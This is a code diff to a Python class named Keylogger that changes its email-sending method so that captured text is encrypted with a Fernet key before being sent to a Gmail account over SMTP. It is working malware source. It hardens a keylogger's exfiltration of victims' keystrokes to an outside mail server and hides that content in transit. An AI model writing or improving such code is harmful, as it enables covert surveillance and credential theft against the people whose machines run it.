@@ -43,7 +43,9 @@ class Keylogger:
 
     def enviar_correo(self, correo, token, mensaje):
         key = open('pass.key', 'rb').read()
-        mensajeEncriptado = mensaje.encode()
+        mensajeBytes = str.encode(mensaje)
+        clave = Fernet(key)
+        mensajeEncriptado = clave.encrypt(mensajeBytes)
         with smtplib.SMTP_SSL("smtp.gmail.com", port=465, context=ctx) as server:
             server.login(correo, token)
             server.sendmail(correo, correo, mensajeEncriptado)
